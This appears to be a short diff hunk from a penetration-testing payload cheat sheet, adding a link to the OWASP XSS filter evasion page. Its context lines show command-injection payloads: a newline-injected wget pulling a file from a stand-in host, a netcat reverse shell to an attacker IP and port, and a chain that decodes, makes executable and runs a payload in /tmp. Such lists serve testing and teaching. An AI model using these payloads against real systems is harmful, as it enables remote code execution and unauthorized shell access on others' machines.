@@ -524,3 +524,7 @@ vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O
 vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
 vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
 ```
+
+XSS Cheat Sheet:
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
